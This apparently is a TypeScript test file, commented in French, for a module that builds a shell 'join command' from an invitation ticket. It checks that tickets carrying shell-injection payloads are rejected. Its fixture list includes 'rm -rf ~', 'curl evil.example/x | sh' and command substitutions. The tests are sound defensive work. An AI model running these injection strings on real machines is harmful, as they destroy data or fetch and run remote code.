// LA COMMANDE D'ENTRÉE — ce qu'on colle sur le poste d'un invité.
//
// ─── CE QUE CE BANC GARDE VRAIMENT ───────────────────────────────────────────
//
// La composition, oui. Mais surtout le REFUS : le résultat de ce module est
// destiné à être collé dans un shell, sur la machine de quelqu'un d'autre, qui
// le fait parce qu'il fait confiance à celui qui l'a invité.
//
// Un billet qui porterait `; rm -rf ~` ne serait donc pas un billet mal formé —
// ce serait une exécution de commande arbitraire, offerte par la ruche et
// blanchie par la confiance. C'est la garde qui compte ici, et c'est elle qu'on
// mute.

import { describe, expect, it } from 'vitest';
import {
  billetCollable,
  commandeEntree,
  DEPOT_BRUT,
  type Systeme,
} from '../src/shared/commande-entree.js';
import { encoderBillet, PREFIXE_BILLET } from '../src/shared/acces.js';

/** Un billet RÉEL, engendré par le même chemin que la ruche. */
const VRAI = encoderBillet({
  url: 'ws://192.168.1.20:7777/ws',
  id: 'b-1',
  secret: 'un-secret-de-banc',
  label: 'Le poste de Camille',
});

describe('un billet collable, et rien d’autre', () => {
  it('LE BILLET QUE LA RUCHE ENGENDRE EST COLLABLE — sinon le cas ne mesure rien', () => {
    // Une garde qui refuserait le cas normal serait pire que pas de garde : on
    // la retirerait le lendemain. On éprouve donc d'abord qu'elle laisse passer
    // ce que `encoderBillet` produit vraiment.
    expect(VRAI.startsWith(PREFIXE_BILLET)).toBe(true);
    expect(billetCollable(VRAI), 'un billet légitime est refusé').toBe(true);
  });

  it('TOUT CE QUI PORTE UN CARACTÈRE ACTIF DE SHELL EST REFUSÉ', () => {
    // ─── L'ASSERTION QUI PORTE LE FICHIER ──────────────────────────────────
    //
    // Chacune de ces chaînes, glissée telle quelle dans la commande, s'exécute
    // sur le poste de l'invité. Ce n'est pas une liste d'échappements à
    // écrire : c'est une liste de choses qui ne sont pas des billets.
    const poisons = [
      `${PREFIXE_BILLET}abc; rm -rf ~`,
      `${PREFIXE_BILLET}abc && curl evil.example/x | sh`,
      `${PREFIXE_BILLET}abc | tee /tmp/vole`,
      `${PREFIXE_BILLET}abc$(whoami)`,
      `${PREFIXE_BILLET}abc\`id\``,
      `${PREFIXE_BILLET}abc'`,
      `${PREFIXE_BILLET}abc"`,
      `${PREFIXE_BILLET}abc def`,
      `${PREFIXE_BILLET}abc\nid`,
      `${PREFIXE_BILLET}abc\\`,
      `${PREFIXE_BILLET}abc>sortie`,
    ];
    for (const p of poisons) {
      expect(billetCollable(p), `ce billet est accepté : ${JSON.stringify(p)}`).toBe(false);
      expect(
        commandeEntree(p, 'posix'),
        `une commande est composée pour : ${JSON.stringify(p)}`,
      ).toBeNull();
      expect(commandeEntree(p, 'windows')).toBeNull();
    }
  });

  it('ce qui n’est pas un billet du tout est refusé', () => {
    // Le préfixe fait partie de la garde : sans lui, n'importe quelle chaîne
    // alphanumérique passerait — y compris le JETON DE RUCHE, qu'on ne doit
    // jamais coller dans une commande d'entrée.
    expect(billetCollable('deadbeefdeadbeefdeadbeefdeadbeef'), 'un jeton nu passe').toBe(false);
    expect(billetCollable(PREFIXE_BILLET), 'un préfixe SANS charge passe').toBe(false);
    expect(billetCollable(''), 'la chaîne vide passe').toBe(false);
    expect(billetCollable(null)).toBe(false);
    expect(billetCollable(undefined)).toBe(false);
    expect(billetCollable(42)).toBe(false);
    // Un billet démesuré n'est pas collable, et une commande d'un mégaoctet
    // n'est pas une commande.
    expect(billetCollable(PREFIXE_BILLET + 'a'.repeat(5_000)), 'un billet démesuré passe').toBe(
      false,
    );
  });
});

describe('la commande, par système', () => {
  const pour = (s: Systeme) => commandeEntree(VRAI, s) ?? '';

  it('POSIX : le billet va AU SCRIPT, pas à sh comme nom de fichier', () => {
    // ─── LE DÉTAIL QUI DÉCIDE DE TOUT ──────────────────────────────────────
    //
    // `curl … | sh -s -- <billet>` : sans le `-s`, `sh` prend le billet pour
    // un fichier à exécuter, ignore l'entrée standard, et l'invité voit
    // « hive2_… : No such file or directory ». La commande aurait l'air juste
    // et ne marcherait sur aucune machine.
    const c = pour('posix');
    expect(c).toContain(`${DEPOT_BRUT}/rejoindre.sh`);
    expect(c, 'le « -s » a disparu : sh lirait le billet comme un fichier').toContain('sh -s --');
    expect(c.endsWith(` ${VRAI}`), 'le billet n’est pas le dernier argument').toBe(true);
  });

  it('WINDOWS : par FICHIER, jamais par `iex`', () => {
    // `iex` évalue une EXPRESSION ; un script à `param()` n'est valide qu'au
    // début d'un SCRIPT. Tuyauter l'un dans l'autre échoue sur toutes les
    // machines — la leçon est déjà payée dans `install.ps1`.
    const c = pour('windows');
    expect(c).toContain(`${DEPOT_BRUT}/rejoindre.ps1`);
    expect(c, 'l’invocation passe par iex — elle ne marchera nulle part').not.toContain('iex');
    expect(c).toContain('-File');
    expect(c).toContain(`-Billet ${VRAI}`);
    expect(c, 'sans -ExecutionPolicy Bypass, Windows refuse le script').toContain(
      '-ExecutionPolicy Bypass',
    );
  });

  it('LES DEUX COMMANDES SONT DIFFÉRENTES — un système, une invocation', () => {
    // Garde bête et utile : le jour où l'on factorise, rien ne doit rendre la
    // même chaîne des deux côtés. Un invité Windows à qui l'on donne la
    // commande POSIX n'a aucun moyen de le savoir avant de la coller.
    expect(pour('posix')).not.toBe(pour('windows'));
  });

  it('le dépôt est un RÉGLAGE — un fork doit pouvoir inviter chez lui', () => {
    // Sans cela, un billet engendré par une ruche installée depuis un fork
    // enverrait l'invité chercher le script chez QUELQU'UN D'AUTRE.
    const c = commandeEntree(VRAI, 'posix', 'https://exemple.test/hive') ?? '';
    expect(c).toContain('https://exemple.test/hive/rejoindre.sh');
    expect(c, 'le dépôt public reste codé en dur').not.toContain('githubusercontent');
  });
});
